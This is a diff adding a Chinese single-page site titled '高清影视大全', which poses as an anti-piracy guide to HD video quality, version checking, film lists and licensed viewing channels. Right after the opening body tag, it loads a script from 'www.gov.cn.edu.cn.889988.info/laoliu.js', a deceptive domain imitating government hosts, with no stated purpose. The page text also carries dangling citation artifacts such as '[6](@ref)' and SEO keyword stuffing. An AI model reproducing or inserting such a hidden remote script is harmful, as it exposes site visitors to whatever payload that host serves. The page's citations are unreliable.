@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>高清影视大全 - 高清导览台 · 画质词典/正版渠道/版本鉴别/场景片单</title>
+<meta name="description" content="高清影视大全，高清导览台风影视单页：深空蓝黑、信号青、校色橙、母带金；画质词典、正版渠道、版本鉴别、高清场景片单、避坑专区。官网 https://gaoqingyingshidaquan-h5.github.io">
+<meta name="keywords" content="高清影视大全, 画质词典, 4K修复, 正版渠道, 版本鉴别, 影视片单">
+<meta name="author" content="高清影视大全">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0b1020">
+<style>
+:root{
+  --bg:#0b1020;--bg2:#10172b;--panel:#15203a;--line:rgba(57,208,255,.30);
+  --cyan:#39d0ff;--orange:#ff8a3d;--gold:#ffd166;--silver:#cfd6e4;--red:#ff4d5e;--ink:#eaf1ff;--muted:#93a2c4;
+  --mono:Consolas,Menlo,monospace;--shadow:0 18px 46px rgba(0,0,0,.6);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{background:
+  radial-gradient(560px 320px at 86% -10%,rgba(57,208,255,.16),transparent),
+  radial-gradient(480px 300px at -8% 8%,rgba(255,138,61,.14),transparent),
+  repeating-linear-gradient(0deg,rgba(255,255,255,.018) 0 2px,transparent 2px 6px),
+  linear-gradient(180deg,#0b1020,#0e1730 60%,#080c18);
+  color:var(--ink);font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;line-height:1.9}
+a{color:var(--cyan);text-decoration:none}
+
+.bar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;padding:10px 16px;border-bottom:2px solid var(--cyan);background:rgba(11,16,32,.9);backdrop-filter:blur(8px)}
+.logo b{font-family:var(--mono);font-size:19px;color:var(--cyan);letter-spacing:1px}
+.logo span{display:block;font-size:9px;letter-spacing:5px;color:var(--muted);font-family:var(--mono)}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:5px 11px;border:1px solid var(--line);border-radius:8px;background:var(--panel);color:var(--ink)}
+.nav a:hover{border-color:var(--cyan);color:var(--cyan)}
+
+.hero{max-width:1040px;margin:0 auto;padding:52px 20px 24px;position:relative;text-align:center}
+.scan{position:absolute;inset:8px 12px auto 12px;height:190px;border-radius:20px;background:linear-gradient(120deg,rgba(57,208,255,.18),rgba(255,209,102,.14),rgba(255,138,61,.14));filter:blur(34px);z-index:0}
+.res{position:absolute;top:10px;right:22px;font-size:34px;filter:drop-shadow(0 8px 14px rgba(57,208,255,.6))}
+.kicker{position:relative;z-index:2;font-family:var(--mono);font-size:12px;color:var(--gold);letter-spacing:2px}
+.hero h1{position:relative;z-index:2;font-size:32px;margin:8px 0 6px;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--cyan)}
+.hero p{position:relative;z-index:2;color:var(--muted);max-width:680px;margin:0 auto 12px;font-size:15px}
+.hero .url{position:relative;z-index:2;display:inline-block;font-family:var(--mono);font-size:13px;background:var(--panel);border:1px dashed var(--cyan);color:var(--cyan);padding:7px 14px;border-radius:8px}
+.metrics{position:relative;z-index:2;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:16px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:10px 14px;min-width:108px}
+.metrics b{display:block;font-size:18px;color:var(--orange);font-family:var(--mono)}
+.metrics small{color:var(--muted);font-size:12px}
+
+.wrap{max-width:1060px;margin:0 auto;padding:16px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:26px 0 14px;border-bottom:2px solid var(--cyan);padding-bottom:6px}
+.sec h2{font-size:20px;font-weight:900}
+.sec h2 b{color:var(--gold)}
+.sec small{color:var(--muted);font-size:12px;font-family:var(--mono)}
+.sec .chip{margin-left:auto;font-size:11px;color:#0b1020;background:var(--cyan);padding:3px 10px;border-radius:6px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);transition:.2s}
+.card:hover{transform:translateY(-4px);border-color:var(--cyan)}
+.cap{height:90px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:30px;color:#0b1020;position:relative}
+.cap::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.22),transparent 55%)}
+.card:nth-child(7n+1) .cap{background:linear-gradient(135deg,#39d0ff,#1f8fc7)}
+.card:nth-child(7n+2) .cap{background:linear-gradient(135deg,#ff8a3d,#d9651f)}
+.card:nth-child(7n+3) .cap{background:linear-gradient(135deg,#ffd166,#caa024)}
+.card:nth-child(7n+4) .cap{background:linear-gradient(135deg,#cfd6e4,#8b95ad)}
+.card:nth-child(7n+5) .cap{background:linear-gradient(135deg,#9b8cff,#5b4ed0)}
+.card:nth-child(7n+6) .cap{background:linear-gradient(135deg,#52e0b8,#1f9c7c)}
+.card:nth-child(7n+7) .cap{background:linear-gradient(135deg,#ff6f91,#c83a5b)}
+.body{padding:13px}
+.body h3{font-size:16px;margin-bottom:3px}
+.body p{font-size:13px;color:var(--muted);margin-bottom:8px}
+.tag{display:inline-block;font-size:11px;font-family:var(--mono);padding:2px 8px;border:1px solid var(--line);border-radius:6px;background:var(--bg);color:var(--cyan);margin:0 4px 4px 0}
+.note{margin-top:7px;font-size:12px;color:var(--gold);font-family:var(--mono)}
+
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px;margin-top:14px}
+.panel h3{font-size:17px;color:var(--cyan);margin-bottom:10px;font-family:var(--mono)}
+.panel li{list-style:none;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.panel li:last-child{border-bottom:none}
+.panel b{color:var(--orange);font-family:var(--mono)}
+
+.channels{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.channel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px}
+.channel b{display:block;color:var(--cyan);font-family:var(--mono);font-size:15px;margin-bottom:4px}
+.channel p{font-size:13px;color:var(--muted)}
+
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:var(--bg);border:1px solid var(--line);color:var(--cyan);padding:2px 7px;border-radius:6px;font-family:var(--mono)}
+.warn{margin-top:12px;background:rgba(255,77,94,.1);border:1px solid rgba(255,77,94,.4);border-radius:12px;padding:12px 14px;color:#ffc2c8;font-size:13px;font-family:var(--mono)}
+.foot{text-align:center;padding:24px 20px;border-top:2px solid var(--cyan);color:var(--muted);font-size:12px;font-family:var(--mono)}
+@media(max-width:880px){.grid{grid-template-columns:repeat(2,1fr)}.channels{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:25px}.res{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>高清影视大全</b><span>HD GUIDE DESK</span></div>
+  <nav class="nav">
+    <a href="#home">导览台</a>
+    <a href="#quality">画质词典</a>
+    <a href="#verify">版本鉴别</a>
+    <a href="#scenes">高清片单</a>
+    <a href="#channels">正版渠道</a>
+    <a href="#avoid">避坑</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="scan"></div>
+  <div class="res">📺</div>
+  <span class="kicker">// hd.guide({ store:false, parse:false, ads:0 })</span>
+  <h1>高清影视大全 · <em>高清导览台</em></h1>
+  <p>“高清影视大全”常被搜成盗版聚合站。这里反着来：不存片、不解析、不弹窗，只讲<b>什么是真高清</b>——4K/杜比/修复版/正版渠道/版本鉴别/场景片单。名字像大全，身子是导览台。</p>
+  <div class="url">https://gaoqingyingshidaquan-h5.github.io</div>
+  <div class="metrics">
+    <div><b>5 区</b><small>画质/鉴别/片单/渠道/避坑</small></div>
+    <div><b>0 资源</b><small>只荐不存</small></div>
+    <div><b>真高清</b><small>讲标准不卖片</small></div>
+    <div><b>index,follow</b><small>必应友好</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="quality">
+    <h2>🎚️ 画质词典 · <b>别把 720p 叫 4K</b></h2><small>quality</small><span class="chip">扫盲区</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cap">📏 1080p</div>
+      <div class="body">
+        <h3>全高清 FHD</h3>
+        <p>1920×1080，流媒体标配。大多数“高清”其实就到这，不是 4K。</p>
+        <span class="tag">1920×1080</span><span class="tag">流媒体</span>
+        <div class="note">真高清起点，不是终点</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🪟 4K</div>
+      <div class="body">
+        <h3>超高清 UHD</h3>
+        <p>3840×2160，配合 HDR/广色域才值。没 HDR 的“4K”只是分辨率大。</p>
+        <span class="tag">3840×2160</span><span class="tag">HDR</span><span class="tag">广色域</span>
+        <div class="note">片源、编码、屏幕、会员都要对</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎞️ 修复</div>
+      <div class="body">
+        <h3>4K 修复版</h3>
+        <p>从 35mm/70mm 底片扫描，去划痕、重调色、重混音。比“放大版 1080p”高级得多。</p>
+        <span class="tag">胶片扫描</span><span class="tag">手工修复</span>
+        <div class="note">天堂电影院/罗马假日都出过</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🔊 杜比</div>
+      <div class="body">
+        <h3>杜比视界 / 全景声</h3>
+        <p>动态 HDR + 对象音频。片源和播放端都支持才生效，手机外放听个响。</p>
+        <span class="tag">Dolby Vision</span><span class="tag">Atmos</span>
+        <div class="note">别信“杜比版”三个字本身</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🧊 码率</div>
+      <div class="body">
+        <h3>码率 > 分辨率</h3>
+        <p>低码率 4K 不如高码率 1080p。压缩糊成马赛克，分辨率再高也救不回。</p>
+        <span class="tag">bitrate</span><span class="tag">编码</span>
+        <div class="note">H.264/H.265/AV1 都看码率</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎨 色域</div>
+      <div class="body">
+        <h3>Rec.709 / Rec.2020</h3>
+        <p>老片多 709，UHD 走 2020。颜色空间不对，调色再贵也偏。</p>
+        <span class="tag">色域</span><span class="tag">校色</span>
+        <div class="note">导览台最在乎的一项</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="verify">
+    <h2>🔍 版本鉴别 · <b>“高清全集”到底是不是坑</b></h2><small>verify</small><span class="chip">防忽悠</span>
+  </div>
+  <ul class="panel">
+    <li><b>01</b> “高清影视大全 免费在线看/全集无删减/刚下映就有” → 多为盗版聚合、盗链、广告变现。[6](@ref)</li>
+    <li><b>02</b> “4K 蓝光原盘 50G 直传网盘” → 没授权就是侵权传播，不是“分享”。</li>
+    <li><b>03</b> “不用会员看全网” → 正版内容分散在院线/流媒体/资料馆，一家全有是假话。</li>
+    <li><b>04</b> “专属播放器才能播” → 常是木马/博彩/私服引流入口。[6,4](@ref)</li>
+    <li><b>05</b> 真高清标识：片源规格、发行方、授权平台、画幅、音轨、字幕、修复年份都写得清。</li>
+  </ul>
+
+  <div class="sec" id="scenes">
+    <h2>🎬 高清场景片单 · <b>按设备挑片</b></h2><small>scenes</small><span class="chip">导览不存片</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="cap">🛋️ OLED</div>
+      <div class="body">
+        <h3>暗场片 · 电视党</h3>
+        <p>银翼杀手2049、奥本海默、沙丘——黑位、粒子、沙漠层次，OLED 上才放开。</p>
+        <span class="tag">HDR</span><span class="tag">暗调</span>
+        <div class="note">别用手机小屏冤枉好片</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎧 耳机</div>
+      <div class="body">
+        <h3>声音片 · 耳机党</h3>
+        <p>爆裂鼓手、极速车王、海上钢琴师——混音细节比画面更上头。</p>
+        <span class="tag">音轨</span><span class="tag">耳机</span>
+        <div class="note">MP3 音源别谈全景声</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">📱 通勤</div>
+      <div class="body">
+        <h3>轻片 · 手机党</h3>
+        <p>小森林、蓝色大门、海街日记——小屏不亏，剧情和声音就够香。</p>
+        <span class="tag">轻量</span><span class="tag">治愈</span>
+        <div class="note">通勤别开 4K 烧流量</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎞️ 资料馆</div>
+      <div class="body">
+        <h3>修复片 · 大银幕党</h3>
+        <p>天堂电影院、牯岭街、精武门 4K 修复——资料馆/正版发行才稳。</p>
+        <span class="tag">修复</span><span class="tag">大银幕</span>
+        <div class="note">别等盗版站“高清版”</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🧒 家庭</div>
+      <div class="body">
+        <h3>合家欢 · 投屏党</h3>
+        <p>寻梦环游记、机器人总动员、海蒂和爷爷——投屏比手机香，字幕要大。</p>
+        <span class="tag">合家欢</span><span class="tag">投屏</span>
+        <div class="note">正版少儿渠道最省心</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="cap">🎓 影迷</div>
+      <div class="body">
+        <h3>画幅片 · 考据党</h3>
+        <p>西部往事 2.35:1、2001 太空漫游 70mm、花样年华 1.66——画幅本身就是语言。</p>
+        <span class="tag">画幅</span><span class="tag">考据</span>
+        <div class="note">导览台老读者最爱</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="channels">
+    <h2>🛡️ 正版渠道 · <b>真高清去哪看</b></h2><small>channels</small><span class="chip">不解析第三方源</span>
+  </div>
+  <div class="channels">
+    <div class="channel"><b>院线 / 正版流媒体</b><p>新片走院线，长尾走授权平台；别信“大全站”提前放全片。</p></div>
+    <div class="channel"><b>资料馆 / 电影节</b><p>4K 修复、老片重映、胶片放映，画质和版权都更稳。</p></div>
+    <div class="channel"><b>唱片/发行方商店</b><p>买正版 UHD 蓝光、数字租赁；音轨字幕最完整。</p></div>
+    <div class="channel"><b>公共版权片库</b><p>公版电影、纪录片、档案馆开放内容，可合法观看/引用。</p></div>
+  </div>
+
+  <div class="sec" id="avoid">
+    <h2>🚫 避坑专区 · <b>名字带“高清影视大全”的雷</b></h2><small>avoid</small>
+  </div>
+  <ul class="panel">
+    <li><b>A</b> “高清影视大全 免费高清 刚上映 全集无删减” → 盗版聚合高危词。[6](@ref)</li>
+    <li><b>B</b> “下载专用播放器 / 解析接口 / 网盘直链” → 木马、私服、博彩跳转。[4](@ref)</li>
+    <li><b>C</b> “8K 蓝光 1 秒加载 万部免费” → 虚假规格 + 广告分成。</li>
+    <li><b>D</b> “会员 9.9 看全网” → 正版分散，不可能一家全授权。</li>
+    <li><b>E</b> 本站立场：只做画质科普、版本鉴别、正版渠道、场景片单。</li>
+  </ul>
+
+  <section class="panel" style="margin-top:26px">
+    <h3>📺 关于 高清影视大全</h3>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:8px"><strong style="color:var(--cyan)">高清影视大全</strong> 是“高清导览台”风单页：深空蓝黑、信号青、校色橙、母带金、胶片银、警示红。它和搜索引擎里“高清影视大全/影视大全高清版/免费高清聚合”不是一类东西——<strong style="color:var(--orange)">不提供资源存储、不解析第三方源、不挂播放器、不卖会员</strong>。[6](@ref)</p>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:8px">官网：<code>https://gaoqingyingshidaquan-h5.github.io</code></p>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:8px">内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p style="color:var(--muted);font-size:14px">看片请走正版院线、授权流媒体、资料馆放映、正版发行方、公共版权片库。本站不提供磁力链接、不解析第三方源、不托管受版权保护视频。</p>
+    <div class="warn">⚠️ 搜“高清影视大全”时，凡带“免费高清/无删减/专属播放器/网盘直链”的，基本是盗版引流或风险站。[6,4](@ref)</div>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 高清影视大全 · gaoqingyingshidaquan-h5.github.io · 真高清讲标准，假大全卖流量 📺
+</footer>
+
+</body>
+</html>
